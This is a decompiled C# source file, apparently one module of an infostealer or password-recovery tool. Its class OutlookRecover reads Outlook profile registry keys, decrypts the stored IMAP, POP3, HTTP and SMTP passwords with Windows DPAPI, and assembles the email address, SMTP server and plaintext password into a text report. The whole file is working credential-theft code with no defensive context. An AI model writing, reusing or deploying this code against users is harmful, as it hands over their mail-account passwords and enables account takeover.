using System;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

// Token: 0x02000012 RID: 18
[StandardModule]
internal sealed class OutlookRecover
{
	// Token: 0x060000B3 RID: 179 RVA: 0x0000CC70 File Offset: 0x0000AE70
	internal static string GetOutlookPasswords()
	{
		string text = "";
		string[] array = new string[]
		{
			"IMAP Password",
			"POP3 Password",
			"HTTP Password",
			"SMTP Password"
		};
		string text2 = "";
		RegistryKey[] array2 = new RegistryKey[]
		{
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676"),
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676"),
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676"),
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676")
		};
		string result;
		try
		{
			foreach (RegistryKey registryKey in array2)
			{
				if (registryKey != null)
				{
					foreach (string name in registryKey.GetSubKeyNames())
					{
						using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
						{
							if (registryKey2.GetValue("Email") != null | (registryKey2.GetValue("IMAP Password") != null | registryKey2.GetValue("POP3 Password") != null | registryKey2.GetValue("HTTP Password") != null | registryKey2.GetValue("SMTP Password") != null))
							{
								if (Operators.CompareString(text, "", false) == 0)
								{
									text = "Outlook: \r\n";
								}
								foreach (string name2 in array)
								{
									if (registryKey2.GetValue(name2) != null)
									{
										byte[] encryptedData = (byte[])registryKey2.GetValue(name2);
										text2 = OutlookRecover.decryptOutlookPassword(encryptedData);
									}
								}
								object objectValue = RuntimeHelpers.GetObjectValue(registryKey2.GetValue("Email"));
								byte[] bytes;
								try
								{
									object utf = Encoding.UTF8;
									Type type = null;
									string memberName = "GetBytes";
									object[] array5 = new object[]
									{
										RuntimeHelpers.GetObjectValue(objectValue)
									};
									object[] arguments = array5;
									string[] argumentNames = null;
									Type[] typeArguments = null;
									bool[] array6 = new bool[]
									{
										true
									};
									object obj = NewLateBinding.LateGet(utf, type, memberName, arguments, argumentNames, typeArguments, array6);
									if (array6[0])
									{
										objectValue = RuntimeHelpers.GetObjectValue(array5[0]);
									}
									bytes = (byte[])obj;
								}
								catch (Exception ex)
								{
									bytes = (byte[])objectValue;
								}
								object objectValue2 = RuntimeHelpers.GetObjectValue(registryKey2.GetValue("SMTP Server"));
								byte[] bytes2;
								if (objectValue2 != null)
								{
									try
									{
										bytes2 = (byte[])registryKey2.GetValue("SMTP Server");
										goto IL_29F;
									}
									catch (Exception ex2)
									{
										object utf2 = Encoding.UTF8;
										Type type2 = null;
										string memberName2 = "GetBytes";
										object[] array7 = new object[]
										{
											RuntimeHelpers.GetObjectValue(objectValue2)
										};
										object[] arguments2 = array7;
										string[] argumentNames2 = null;
										Type[] typeArguments2 = null;
										bool[] array6 = new bool[]
										{
											true
										};
										object obj2 = NewLateBinding.LateGet(utf2, type2, memberName2, arguments2, argumentNames2, typeArguments2, array6);
										if (array6[0])
										{
											objectValue2 = RuntimeHelpers.GetObjectValue(array7[0]);
										}
										bytes2 = (byte[])obj2;
										goto IL_29F;
									}
								}
								bytes2 = Encoding.UTF8.GetBytes("Nothing");
								IL_29F:
								text = text + "SMTP: " + Encoding.UTF8.GetString(bytes2).Replace("\0", "") + "\r\n";
								text = text + "User: " + Encoding.UTF8.GetString(bytes).ToString().Replace(Conversions.ToString(Convert.ToChar(0)), "") + "\r\n";
								text = text + "Pass: " + text2.Replace(Conversions.ToString(Convert.ToChar(0)), "") + "\r\n\r\n";
							}
						}
					}
				}
			}
			result = text;
		}
		catch (Exception ex3)
		{
		}
		return result;
	}

	// Token: 0x060000B4 RID: 180 RVA: 0x0000D04C File Offset: 0x0000B24C
	public static string decryptOutlookPassword(byte[] encryptedData)
	{
		byte[] array = new byte[encryptedData.Length - 2 + 1];
		Buffer.BlockCopy(encryptedData, 1, array, 0, encryptedData.Length - 1);
		string @string = Encoding.UTF8.GetString(ProtectedData.Unprotect(array, null, DataProtectionScope.CurrentUser));
		return @string.Replace(Conversions.ToString(Convert.ToChar(0)), "");
	}
}
